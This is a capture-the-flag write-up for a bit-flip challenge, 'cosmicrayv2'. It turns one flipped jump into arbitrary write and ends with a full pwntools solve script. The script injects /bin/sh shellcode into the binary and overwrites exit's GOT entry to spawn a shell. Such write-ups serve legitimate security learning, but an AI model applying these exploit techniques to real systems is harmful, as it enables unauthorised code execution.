We are given a binary:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/718d58f0-271a-4280-ad6f-8fa6526d6ccb)

We are allowed to change exactly one bit in the binary:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/ba58e500-4e30-4462-8436-5407012a30d1)

Let's open the binary in ghidra and see if there is any place of interest in which we might want to change a bit.
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/4094b4e5-8e26-4d38-bdb9-0f0b8ed33362)

We can see that because the binary has a canary, there is a conditional jump that checks for buffer overflows.   
In the opcode the `05` stands for how many bytes forward to jump. Also note, that not too far below is the main function.  
It is possible then to flip a bit on this conditional jump, to jump back to the main function and allow us to change as many bytes as we want.

Now that we have arbitrary write access, we can just write shellcode to wherever in the program, and then jump to our shellcode.

Solve Script:
```python3
#!/usr/bin/env python2

import os
import re
import sys

from pwn import *
import warnings
warnings.filterwarnings('ignore', category=BytesWarning)


def zerobyte(p, addr):
    # obtain current bits
    p.sendline(hex(addr))
    p.recvuntil('----\n')
    line = p.recvline(keepends = False)
    print(line)
    bits = line.split(b'|')[1:-1]
    log.info(f"Emptying {hex(addr)}.\n Current state: {bits}\n")
    p.sendline('1')
    p.recvuntil("flip:")
    # now flip all 1 bits
    for i in range(8):
        bit = bits[i]
        if bit == b'1':
            p.recvuntil("through:")
            p.sendline(hex(addr))
            p.recvuntil("flip:")
            p.sendline(str(i))
    # correct the one we messed with while getting the initial state
    p.recvuntil("through:")
    p.sendline(hex(addr))
    p.recvuntil("flip:")
    p.sendline('1')        
    log.success("Zeroed Byte!\n")
def writebyte(p,addr,value):
    
    log.info(f"Writing {value} to {addr}\n")
    for i in range(8):
        if value & (1 << i) != 0:
            p.sendlineafter("through:", hex(addr))
            p.sendlineafter('flip:', str(7-i))

elf = ELF("./cosmicrayv2_patched")
libc = ELF("./libc-2.35.so")
context.binary = elf
context.arch = 'amd64'
context.bits = 64

p = process('./cosmicrayv2_patched')

# step 1: Change JZ such that we can modify any amount of bits that we want
jz = '0x4015e2'
p.recvuntil("through:")
p.sendline(jz)
p.recvuntil("flip:")
p.sendline(b'4')

# start writing shellcode at 0x004011f0
shellcode_addr = 0x4011f0
shellcode = asm(shellcraft.amd64.linux.sh())
for i in range(len(shellcode)):
    zerobyte(p,shellcode_addr+i)
    writebyte(p,shellcode_addr+i,shellcode[i])

# write address of shellcode to exit_got
exit_got = elf.got["exit"]

shellcode_bytes = bytearray(p64(shellcode_addr))
log.info(f"Zeroing exit_got")
for i in range(8):
    zerobyte(p,exit_got+i)
log.info(f"Writing address of shellcode to exit_got")
for i in range(len(shellcode_bytes)):
    writebyte(p, exit_got+i, shellcode_bytes[i])

#execute exit
p.sendlineafter('through:', "P"*20)
p.sendlineafter('flip:','9')
p.interactive()
```
